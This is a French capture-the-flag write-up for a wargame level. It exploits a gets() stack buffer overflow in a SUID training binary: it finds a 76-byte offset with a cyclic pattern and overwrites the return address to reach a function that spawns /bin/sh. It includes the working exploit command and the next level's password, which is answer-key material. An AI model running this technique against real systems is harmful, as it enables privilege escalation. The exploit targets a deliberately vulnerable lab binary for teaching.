level1:

On prend le reflex de decompiler le binaire (cf source)
On voit une fonction run() qui a un return system("/bin/sh") qu'il va falloir exploiter


(gdb) disas main
Dump of assembler code for function main:
   0x08048480 <+0>:     push   %ebp
   0x08048481 <+1>:     mov    %esp,%ebp
   0x08048483 <+3>:     and    $0xfffffff0,%esp
   0x08048486 <+6>:     sub    $0x50,%esp
   0x08048489 <+9>:     lea    0x10(%esp),%eax
   0x0804848d <+13>:    mov    %eax,(%esp)
   0x08048490 <+16>:    call   0x8048340 <gets@plt>
   0x08048495 <+21>:    leave  
   0x08048496 <+22>:    ret 

Donc ici il faut qu'on trouve un moyen de faire executer run() au programme car ce n'est actuellement pas le cas

Ici notre principal allie est la fonction gets() qui ne verifie pas l'entree donnee
Elle nous permet d'ecrire sur le stack pour faire un buffer overflow
Imaginons si un buffer[64] est envoye sur la stack, si j'envoie 70 char dans gets je vais pouvoir modifier des zones memoires

Qu'est ce que je peux modifier ?

La stack est une pile donc c'est empile et chaque fonction a sa stack frame
Ok et ca nous avance a quoi de savoir ca ?

Et bien a chaque call d'une fonction il se passe en realite deux operations :
    push EIP
    jmp <adresse de la fonction>

Avant de jump a l'adresse de la fonction il va push sur la stack EIP
EIP est l'instruction pointer
C'est un moyen indispensable pour un programme de garder son flux d'execution,
car a la fin de la stack frame de la fonction call il va bien falloir revenir la ou elle a ete appelee

En sachant cela, on peut regarder sur gdb:

Commencons par mettre un break point et run notre programme
(gdb) i f
Stack level 0, frame at 0xbffff740:
 eip = 0x8048481 in main; saved eip 0xb7e454d3

Avec seulement ces informations on sait que le saved eip est en fait le retour de la fonction main

On peut afficher l'instruction a <adresse> avec x/i
(gdb) x/i 0xb7e454d3
   0xb7e454d3 <__libc_start_main+243>:  mov    %eax,(%esp)

Donc le retour de la fonction main ira a <__libc_start_main+243>

Ne sera-t-il pas la notre moyen d'envoyer le retour de la fonction main a la fonction run() ?
Essayons de modifier cela:

Deja pour trouver l'adresse de run on peut :
(gdb) p run
    1 = {<text variable, no debug info>} 0x8048444 <run>

Nous avons donc maintenant tout les elements pour parvenir a executer run et notre appel system("/bin/sh")

Mais quel registre modifier et comment le faire ?

On peut utiliser un pattern d'overflow : Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Cela nous permet d'avoir un offset entre le buffer et l'adresse a modifier (ebp+4)
Envoyons ce pattern a get

x/4x %ebp
0xbffff728:     0x41346341      0x63413563      0x37634136      0x41386341

On voit que les caracteres ascii de notre chaine a ecraser la memoire
On peut envoyer ebp+4 (0x63413563) sur notre site (https://wiremask.eu/tools/buffer-overflow-pattern-generator/?)
Qui va calculer l'offset entre le debut du pattern et la valeur contenu dans ebp+4
Cela nous donne 76 d'offset

Nous savons maintenant qu'il faut ecraser 76 bytes memoire avant d'atteindre ebp+4
Plus qu'a faire une petite commande python et envoyer 

(python -c 'print "A"*76 + "\x44\x84\x04\x08"'; cat) | ./level1

Via gdb on pouvait set ebp+4 directement
(gdb) set {int}(ebp+4)=0x8048444

Mais gdb a des protections et cela nous permet pas d'executer le programme avec le bit SUID
Donc oblige de passer en ligne de commande ou via un script extern a gdb

cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77